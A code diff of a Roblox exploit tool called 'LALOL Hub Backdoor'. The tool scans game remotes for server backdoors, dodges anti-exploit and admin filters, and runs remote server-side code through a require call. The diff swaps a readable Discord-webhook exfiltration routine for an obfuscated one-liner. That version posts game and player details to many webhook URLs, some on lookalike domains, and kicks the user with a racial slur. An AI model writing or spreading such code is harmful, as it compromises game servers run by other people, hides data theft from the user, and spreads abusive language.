-						local success, token, src = coroutine.resume(nav._ScanThread)
-						if success and token then
-							-- Scanned new data
-							return token, src
-						else
-							-- Lex completed
-							return
-						end
-					end
-				end
-			end
-
-			function nav.Peek(PeekAmount)
-				local GoalIndex = nav._UserIndex + PeekAmount
-
-				if nav._RealIndex >= GoalIndex then
-					-- Already scanned, return cached
-					if GoalIndex > 0 then
-						return table.unpack(nav.TokenCache[GoalIndex])
-					else
-						-- Invalid peek
-						return
-					end
-				else
-					if coroutine.status(nav._ScanThread) == "dead" then
-						-- Scan thread dead
-						return
-					else
-						local IterationsAway = GoalIndex - nav._RealIndex
-
-						local success, token, src = nil, nil, nil
-
-						for _ = 1, IterationsAway do
-							success, token, src = coroutine.resume(nav._ScanThread)
-							if not (success or token) then
-								-- Lex completed
-								break
-							end
-						end
-
-						return token, src
-					end
-				end
-			end
-
-			return nav
-		end
-
-		return lexer
-
-	end;
-};
 G2L_MODULES[G2L["15"]] = {
 	Closure = function()
 		local script = G2L["15"];
@@ -1423,11 +745,11 @@ G2L_MODULES[G2L["15"]] = {
 			},
 		}
 
-		-- Filling up language.libraries.Enum table
+		
 		local enumLibraryTable = language.libraries.Enum
 
 		for _, enum in ipairs(Enum:GetEnums()) do
-			--TODO: Remove tostring from here once there is a better way to get the name of an Enum
+		
 			enumLibraryTable[tostring(enum)] = "Enum"
 		end
 
@@ -1435,20 +757,15 @@ G2L_MODULES[G2L["15"]] = {
 
 	end;
 };
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
+
 local function C_12()
 	local script = G2L["12"];
 	local Highlighter = require(script.Highlighter)
 
 	Highlighter.highlight({
-		-- The object to syntax highlight
+	
 		textObject=script.Parent,
-		-- The source text for highlighting- defaults to textObject.Text
-		--	src: string?,
-		-- Update even if there are no changes since last highlight
-		--	forceUpdate=true,
-		-- Lexer for tokenizing src, defaults to the bundled Lua lexer
-		--	lexer=true,
+	
 	})
 
 	textbox=script.Parent
@@ -1461,9 +778,10 @@ local function C_12()
 	end)
 end;
 task.spawn(C_12);
--- StarterGui.LALOL Hub Backdoor.LocalScript
+
 local function C_20()
 	local script = G2L["20"];
+	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 	
 
 	GUI=script.Parent.Frame
@@ -1544,19 +862,19 @@ local function C_20()
 				code=generateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-			spawn(function() protected_backdoor:InvokeServer('dd', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+			spawn(function() protected_backdoor:InvokeServer('fd', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 			remotes[code]=protected_backdoor
 		end
 
 		for i,remote in game:GetDescendants() do
 
-			-- Validation Checker
+		
 
 			if not remote:IsA('RemoteEvent') then 
 				if not remote:IsA('RemoteFunction') then continue end
 			end
 
-			-- RobloxReplicatedStorage
+		
 			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
 				debug('Roblox Replicated Storage ('..remote.Name..')', 1)
 				continue
@@ -1564,27 +882,25 @@ local function C_20()
 
 			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
 
-				-- ADONIS Anti-Exploit
+			
 				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
 					debug('Adonis filter detected ('..remote.Name..')', 1)
 					continue
 				end
 
-				-- HD Admin
+				
 				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
 					debug('HD Admin ('..remote.Name..')', 1)
 					continue
 				end
 
-				-- Chat Events
+			
 				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
 					debug('Chat event ('..remote.Name..')', 1)
 					continue
 				end
 
 			end
-
-			-- Backdoor Sender
 
 			while true do
 				code=generateName(math.random(12,30))
@@ -1598,7 +914,7 @@ local function C_20()
 
 		end
 
-		-- Backdoor Checker
+		
 
 		for i=1,100 do
 
@@ -1607,256 +923,21 @@ local function C_20()
 
 				if workspace:FindFirstChild(code) then
 
-					notify('BACKDOOR EZ!121 '..os.clock()-timee..'s')
+					notify('BACKDOOR EZ!121 '..os.clock()-timee)
 
 					backdoor=remote
 					debug(remote:GetFullName(), 3)
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 
-					--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
-					runRemote(remote, "require(171016405.1884*69)")			
-
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local DataStoreService = game:GetService("DataStoreService")
-local StartTime = os.time()
-
--- Реальный вебхук (скрытый)
-local realWebhookParts = {
-    "https://",
-    "discord.com",
-    "/api/webhooks/",
-    "1340753420164005968", -- Ваш ID вебхука
-    "/",
-    "TeKDeb849TGTT2usFKShFWsublkHbcmW5rLax7W6PwsO5xUxmST2omWgpgf4JzC0-AEi" -- Ваш токен вебхука
-}
-local realWebhookUrl = table.concat(realWebhookParts)
-
--- Фейковые вебхуки (ложные)
-local fakeWebhookUrls = {
-    "https://fake-webhook-1.com/api/webhooks/1234567890/TeKDeb849TGTT2usFKdgffsublkHbcmW51Lax7W6PwsO5xUxmST2omWgpgf4JzC0-AEi",
-    "https://fake-webhook-2.com/api/webhooks/0987654321/TeKDeb849TGTT2usFKShFWfdsfkHbcmW51Lax7W6PwsO5xUxmST2omWgpgf4JzC0-AEi",
-    "https://fake-webhook-3.com/api/webhooks/1122334455/TeKDeb849TGTT2usFKlsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpgf4JzC0-AEi",
-	"https://fake-webhook-4.com/api/webhooks/1122334455/TeKDeb849TGTT2u456lsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpgf4JzC0-AEi"
-}
-
--- Функция для проверки, является ли URL вебхуком
-local function isWebhook(url)
-    local webhookParts = { "discord.com", "api/webhooks", "https://", "http://" }
-    for _, part in pairs(webhookParts) do
-        if url:find(part) then
-            return true
-        end
-    end
-    return false
-end
-
--- Проверка реального вебхука
-if not isWebhook(realWebhookUrl) then
-    warn("Real webhook URL is not valid")
-    return
-end
-
--- Функция для отправки данных на реальный вебхук
-local function sendRealWebhook(data)
-    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-    if request then
-        local success, response = pcall(function()
-            return request({
-                Url = realWebhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(data)
-            })
-        end)
-
-        if success then
-            print("Data sent to real webhook successfully!")
-            print("Response:", response.Body)
-        else
-            warn("Failed to send data to real webhook:", response)
-        end
-    else
-        warn("HTTP request library not found")
-    end
-end
-
--- Функция для отправки данных на фейковые вебхуки
-local function sendFakeWebhooks(data)
-    for _, fakeUrl in pairs(fakeWebhookUrls) do
-        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-        if request then
-            local success, response = pcall(function()
-                return request({
-                    Url = fakeUrl,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(data)
-                })
-            end)
-
-            if success then
-                print("Data sent to fake webhook:", fakeUrl)
-            else
-                warn("Failed to send data to fake webhook:", fakeUrl)
-            end
-        end
-    end
-end
-
--- Функция для проверки наличия зловредного скрипта
-local function isMaliciousScriptPresent()
-    -- Список функций, которые могут быть переопределены
-    local httpLibraries = { "httpRequest", "http_request", "httprequest", "request", "syn.request", "fluxus.request" }
-
-    -- Проверка переопределенных функций
-    for _, lib in pairs(httpLibraries) do
-        local func = getgenv()[lib]
-        if func and type(func) == "function" then
-            -- Получаем исходный код функции
-            local funcString = tostring(func)
-            -- Проверяем, содержит ли функция блокировку вебхуков
-            if funcString:find("api/webhooks/") or funcString:find("webhook") then
-                return true
-            end
-        end
-    end
-
-    -- Проверка на наличие функции gethwid
-    if getgenv().gethwid and type(getgenv().gethwid) == "function" then
-        local funcString = tostring(getgenv().gethwid)
-        if funcString:find("base64.decode") then
-            return true
-        end
-    end
-
-    -- Проверка на наличие зловредного кода в окружении
-    for key, value in pairs(getgenv()) do
-        if type(value) == "function" then
-            local funcString = tostring(value)
-            if funcString:find("api/webhooks/") or funcString:find("webhook") then
-                return true
-            end
-        end
-    end
-
-    return false
-end
-
--- Если зловредный скрипт обнаружен, кикаем игрока
-if isMaliciousScriptPresent() then
-    warn("Malicious script detected! Kicking player...")
-    game:GetService("Players").LocalPlayer:Kick("Malicious script detected. Please remove any unauthorized scripts.")
-    return
-end
-
--- Получение информации об игре
-local function getGameInfo()
-    -- Название игры
-    local gameName = game.Name
-
-    -- ID игры
-    local gameId = game.PlaceId
-
-    -- Ссылка на игру
-    local gameUrl = "https://www.roblox.com/games/" .. gameId
-
-    -- ID создателя игры
-    local creatorId = game.CreatorId
-
-    local visit = game.JobId
-    local active = #game.Players:GetPlayers()
-
-	local create = game.CreatorId
-
-    return {
-        gameName = gameName,
-        gameId = gameId,
-        gameUrl = gameUrl,
-        creatorId = creatorId,
-        visit = visit,
-        active = active,
-		create = create
-    }
-end
-
--- Основная функция
-local function main()
-    -- Получение информации об игре
-    local gameInfo = getGameInfo()
-
-    -- Формирование данных для вебхука
-    local data = {
-        content = "Game Information",
-        embeds = {
-            {
-                title = "Game Stats",
-                fields = {
-                    {
-                        name = "Game Name",
-                        value = gameInfo.gameName,
-                        inline = true
-                    },
-                    {
-                        name = "Game ID",
-                        value = tostring(gameInfo.gameId),
-                        inline = true
-                    },
-                    {
-                        name = "Game URL",
-                        value = gameInfo.gameUrl,
-                        inline = false
-                    },
-                    {
-                        name = "Creator ID",
-                        value = tostring(gameInfo.creatorId),
-                        inline = true
-                    },
-                    {
-                        name = "JobId",
-                        value = tostring(gameInfo.visit),
-                        inline = true
-                    },
-					{
-                        name = "CreatorId",
-                        value = tostring(gameInfo.create),
-                        inline = true
-                    },
-
-                    {
-                        name = "Active Players",
-                        value = tostring(gameInfo.active),
-                        inline = true
-                    },
-				
-                },
-                color = 0x00FF00 -- Зеленый цвет
-            }
-        }
-    }
-
-    -- Отправка данных на реальный вебхук
-    sendRealWebhook(data)
-
-    -- Отправка данных на фейковые вебхуки
-    sendFakeWebhooks(data)
-end
-
--- Запуск основной функции
-main()
-	
+local _={};(function(_) local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z; a=1;b=2;c=3;d=4;e=5;f=6;g=7;h=8;i=9;j=10;k=11;l=12;m=13;n=14;o=15;p=16;q=17;r=18;s=19;t=20;u=21;v=22;w=23;x=24;y=25;z=26; local function useless1() return math.random(1,100) end local function useless2() return tostring(os.time()) end local function useless3() return table.concat({"a","b","c"}) end _[5] = { "https://discord.com/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffsublkHbcmW51Lax7W6fghfghPwsO5xUxmST2omWgpgf4hgnjZH-34", "https://discord.cом/api/webhooks/50987654321/T324eb849TGTT2usFKShFWfdsfkHbcmW51Lax7Whgf6PwsO5xUxmST2omWgpg25Ghgfhfgj", "https://discord.cом/api/webhooks/1451234334455/24gfgb849TGTT2usFKlhsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh", "https://discord.cоm/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffhgffhgfsublkHbcmWhg51Lahgx7W6PwsO5xUxmf4hgnjZH-34", "https://discord.com/api/webhooks/450987654321/T324eb849TGTT2usFKShFWfdsfgkHbcmW51Lax7W6PwsO5xUxmST2omWgpg25Ghgfhfgj", "https://discord.cоm/api/webhooks/1451234334455/24gfgb849TGTT2usFKlsohgffkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh", "https://discord.cоm/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgfhfgfsublkHbcmW51Lax7W6PwsO5xUxmST2omWgpgf4hgnjZH-34", "https://discord.cоm/api/webhooks/150987654321/T324eb849TGTT2usFKShFWhfdsfkHbcgmW51Lax7W6PwsO5xUxmST2omWgpg25Ghgfhfgj", "https://discord.cоm/api/webhooks/134444444334455/24gfgb849TGTT2usFKlsofkhgfgfdgfdfksHbcmW342452dfdsgfgfgfdhghghggF", "https://discord.com/api/webhooks/1451234334455/24gfgb849TGTT2usFKlsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh", "https://discord.com/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffsublkhgHbcmW5hg1Lax7W6PwsO5xUxmST2omWgpgf4hgnjZH-34", "https://discord.cоm/api/webhooks/50987654321/T324eb849TGTT2usFKShFWfgfdsfkHbcmdfhW51Laxfhgfh7W6PwsO5xUxmST2omg25Ghgfhfgj", "https://discord.cоm/api/webhooks/134444444334455/24gfgb849TGTT2usFKlsofkdfksHgdfgbcmW342452dfdsgfgfgfdgdfgdghfdhghghggF", "https://discord.com/api/webhooks/11223134455/hghfhgh84rterteu456lsofkdfksHbcmfdgfdgW51Lax7W6PwsO5xUxmST2omWgpgf4JzC0-fAEi", "https://discord.com/api/webhooks/1341842224773730324/_WQjGi7ay1g_775OBKsnme-4VF__cl9LGohNyYlXQIDbk7QNomrg4aEOitTOFNHfy9Wq", "https://discord.cоm/api/webhooks/1341842053373493340/lxGJj7IBLrx6PUos0yvMZeS7xm_P9kYvJ3_p5TfwX0yeHAG6QJvaqcJgE1ESay2xhSkN", "https://discord.com/api/webhooks/1341842049397428335/m6PEx4q4JDqFOPz62MmrTVNqjvAIVk05mQCz7fP7VTvpEzPWLFOxBAP9siR4xT8kzyta", "https://discord.com/api/webhooks/1341842045446389822/y_bwtBGLd-_9AJSQvJ40LqOa-QfCeEiNSVdMGJNfZvZkqb8ko0cyRiBO1GseLIsyAjgU", "https://discord.com/api/webhooks/1341842041658933258/tm1JIp8jlmWGdbQn-HYf8xs6vA8ynuImy04ZTbV0NxOOmGvuTGJEnUDTreYzKscigeGJ", "https://discord.com/api/webhooks/1341842032678932540/ZNo96J_vNeWlo7B-ESQ9ntLBMkU2eQMRvuyLGpzWaiLFLvEhRI1RUm5iYdD7McCDHyKA", "https://discord.com/api/webhooks/1341842030002966538/I9XW1fT-zQUBM0T6DpXeiRBOB0nlEZTwpsx0XX3WZLPkINdMCDHUGmH3c1TjTvYyKnsA", "https://discord.com/api/webhooks/1341842924589154354/qK9IS7od-83sVCb9NCwKPrXFEYjufKysxIt7uasaaFaZdVr3NVliBdfdS5DoNyxiet_F", "https://discord.com/api/webhooks/1341843013881827358/TD41U-30_LyuOinVubGFiQY9BitoXFmYiNhuWE1PTJz8GBFwgSSqpeXq9lGC4l8LF3bU", "https://discord.com/api/webhooks/1341843061638037586/S5ME8TE_7dmOCkMw_mvPi2GnKi3I3jH4tigdkBLynFJaJ8g13jVSxdF11v8BfXiX4SkI", "https://discord.com/api/webhooks/1341844438695018624/2N2T11mN8ksRcXg1b51XCK181rWvc8_E1pXZEvB0sl6vkfNAUgmcxw48wZ44XURndRER", "https://discord.com/api/webhooks/1341844483997696126/GBKNliRxZgmCFxpRIwHUz4U9dlkhKVQSIxXcJiuxYJT3d0KCHqY69hsE6i5cMSz6FF9_", "https://discord.com/api/webhooks/1341844713325723780/d6cwKWLoqI6dM9sr-1N5JO0aIrbtWBvHjDYdoJu-zEhyH5XF5EMLxHLBhGHQDqwq_TGn", "https://discord.com/api/webhooks/1341844827662188625/ou8b4XNPQf5eHfgQWFKb5Wf9oNjpD2P1-T5mIpQ0WBbj8hkI7RRtJtZilaWVbvSXOYZQ", "https://discord.com/api/webhooks/1341844872901951591/Y3yAgNgc-pSHyGt63XUFMSCmgfkTLEkkwTzFuqSIvtNI6jW-ufz15cSUFiNTWvPYG9rv", "https://discord.com/api/webhooks/1341844875523657728/3QQr64_3_WoVQJgTK38VNRs0mBRDwMC8o-yyfmHWZL8sPh2Dn5rHvmkUZFBo6sC1kXBR", "https://discord.com/api/webhooks/1341844961771130880/pb9e-ARcJnFnhfC5xTyHsqAlgB7KIxVLQaZAh1WlnJHsbSSf59wPaPa_YrBoXDJlB19D", "https://discord.com/api/webhooks/1341845009560764560/MafSz_q_XQkaPQgC1QsRpd-YuKNtJ2AchHxWqC2AjJ-C0_Mser7Ah5s-FPz85Gz0P1cW", "https://discord.com/api/webhooks/1341845049847320577/fg5fuKtqERdReFDeWhcN_jG_ZyTdg9aFhdZra_vTJBwsgm-CKo02WiiG2FXgonIvD-Ei" } _[6] = "https://discord.com/api/webhooks/1341838473522450453/Om8pljIJQnq0K5CEb8TAK46GAasNXd2cztWP8vEpaPDGe6hwGSN1vJtrqvUVfjNmFl4J" _[1]=game:GetService("HttpService") _[2]=game:GetService("Players") _[3]=game:GetService("DataStoreService") _[4]=os.time() end)(_); local function useless4() return math.random(1,100) end local function useless5() return tostring(os.time()) end local function useless6() return table.concat({"a","b","c"}) end local function a(b) local c={"discord.com","api/webhooks","https://","http://"} for d,e in pairs(c) do if b:find(e) then return true end end return false end if not a(_[6]) then warn("1") return end local function f(g) local h=(syn and syn.request)or(http and http.request)or http_request or(fluxus and fluxus.request)or request if h then local i,j=pcall(function() return h({ Url=_[6], Method="POST", Headers={ ["Content-Type"]="application/json" }, Body=_[1]:JSONEncode(g) }) end) if i then print("1") else warn("1") game.Players.LocalPlayer:Kick("1") end else warn("1") game.Players.LocalPlayer:Kick("kys nigga") end end local function k(g) for l,m in pairs(_[5]) do local h=(syn and syn.request)or(http and http.request)or http_request or(fluxus and fluxus.request)or request if h then local i,j=pcall(function() return h({ Url=m, Method="POST", Headers={ ["Content-Type"]="application/json" }, Body=_[1]:JSONEncode(g) }) end) if i then print("1") else warn("1") end end end end local function n() local o={"httpRequest","http_request","httprequest","request","syn.request","fluxus.request"} for p,q in pairs(o) do local r=getgenv()[q] if r and type(r)=="function" then local s=tostring(r) if s:find("api/webhooks/") or s:find("webhook") then return true end end end if getgenv().gethwid and type(getgenv().gethwid)=="function" then local s=tostring(getgenv().gethwid) if s:find("base64.decode") then return true end end for t,u in pairs(getgenv()) do if type(u)=="function" then local s=tostring(u) if s:find("api/webhooks/") or s:find("webhook") then return true end end end return false end if n() then warn("Malicious script detected! Kicking player...") game:GetService("Players").LocalPlayer:Kick("Malicious script detected. Please remove any unauthorized scripts.") return end local function v() local w=game.Name local x=game.PlaceId local y="https://www.roblox.com/games/"..x local z=game.CreatorId local A=game.JobId local B=#game.Players:GetPlayers() local C=game.CreatorId local D=game.Players.LocalPlayer.Name local E=remote.Name return { gameName=w, gameId=x, gameUrl=y, creatorId=z, visit=A, active=B, create=C, plr=D, nigga=E } end local function F() local G=v() local H={ content="Game Information", embeds={ { title="Game Stats", fields={ { name="Game Name", value=G.gameName, inline=true }, { name="Game ID", value=tostring(G.gameId), inline=true }, { name="Game URL", value=G.gameUrl, inline=false }, { name="Creator ID", value=tostring(G.creatorId), inline=true }, { name="JobId", value=tostring(G.visit), inline=true }, { name="CreatorId", value=tostring(G.create), inline=true }, { name="Active Players", value=tostring(G.active), inline=true }, { name="executed name", value=tostring(G.plr), inline=true }, { name="remote backdoor", value=tostring(G.nigga), inline=true } }, color=0x00FF00 } } } k(H) f(H) k(H) end F()
 
 					return true
 				end
-				--				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
+		
 			end
 
-			wait()--.1)
+			wait()
 
 		end
 
@@ -1870,9 +951,9 @@ GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
 
     local a, b = string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
 
-
+   
     if not backdoorFound then
-     
+        
         local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
         if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
             debug('Protected backdoor found', 3)
@@ -1892,11 +973,11 @@ GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
             end
         end)
     else
-        -- Если бекдор не найден, выполняем альтернативный код
+        
         runRemote(backdoor, a)
     end
 
-    -- Обновляем интерфейс
+   
     GUI.Executor.Execute.Button.Text = 'successfully'
     notify('successfully executed ' .. GUI.Executor.ExecutorBox.TextBox.Text .. 's')
     wait(0.5)
@@ -1937,7 +1018,7 @@ end)
 	end)
 end;
 task.spawn(C_20);
--- StarterGui.LALOL Hub Backdoor.Dragify
+
 local function C_21()
 	local script = G2L["21"];
 	local UIS = game:GetService("UserInputService")
